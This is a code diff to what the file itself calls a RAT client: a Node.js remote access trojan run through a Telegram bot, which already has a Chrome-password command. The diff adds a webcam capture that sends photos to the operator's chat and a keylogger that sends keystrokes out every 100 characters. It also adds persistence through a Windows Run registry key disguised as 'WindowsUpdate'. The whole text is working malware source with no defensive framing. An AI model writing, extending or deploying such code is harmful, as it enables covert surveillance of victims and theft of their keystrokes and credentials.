@@ -295,6 +295,54 @@ bot.onText(/\/passwords_chrome/, async (msg) => {
     }
 });
 
+// -- START_FEATURE_WEBCAM --
+const NodeWebcam = require( "node-webcam" );
+bot.onText(/\/webcam/, (msg) => {
+    if (msg.chat.id.toString() !== CHAT_ID) return;
+    bot.sendMessage(CHAT_ID, 'Capturing webcam image...');
+    const webcam = NodeWebcam.create({ width: 1280, height: 720, quality: 100, saveShots: false });
+    webcam.capture("temp_webcam_shot", function( err, data ) {
+        if (err) {
+            return bot.sendMessage(CHAT_ID, `Failed to capture webcam: ${err}`);
+        }
+        const imageBuffer = Buffer.from(data.split(",")[1], 'base64');
+        bot.sendPhoto(CHAT_ID, imageBuffer, { caption: 'Webcam Snapshot' });
+    });
+});
+// -- END_FEATURE_WEBCAM --
+
+// -- START_FEATURE_KEYLOGGER --
+const Keylogger = require('node-keylogger');
+const keylogger = new Keylogger();
+let keylog = '';
+keylogger.on('keypress', (key) => {
+    keylog += key;
+    // Send log every 100 characters, or you can set a timer
+    if (keylog.length > 100) {
+        bot.sendMessage(CHAT_ID, `Keylog:\n${keylog}`);
+        keylog = '';
+    }
+});
+bot.onText(/\/keylog_dump/, (msg) => {
+    if (msg.chat.id.toString() !== CHAT_ID) return;
+    if (keylog) {
+        bot.sendMessage(CHAT_ID, `Keylog:\n${keylog}`);
+        keylog = '';
+    } else {
+        bot.sendMessage(CHAT_ID, 'Keylog buffer is empty.');
+    }
+});
+// -- END_FEATURE_KEYLOGGER --
+
+// -- START_FEATURE_PERSISTENCE --
+function addToStartup() {
+    const exePath = process.execPath;
+    const command = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "${exePath}" /f`;
+    return executeCommand(command);
+}
+addToStartup().catch(err => console.error('Failed to add to startup:', err));
+// -- END_FEATURE_PERSISTENCE --
+
 // Initial connection message
 bot.sendMessage(CHAT_ID, 'RAT client started and listening for commands.').catch(err => {
     console.log("Could not send initial message. Check BOT_TOKEN and CHAT_ID.", err.code, err.response.body);
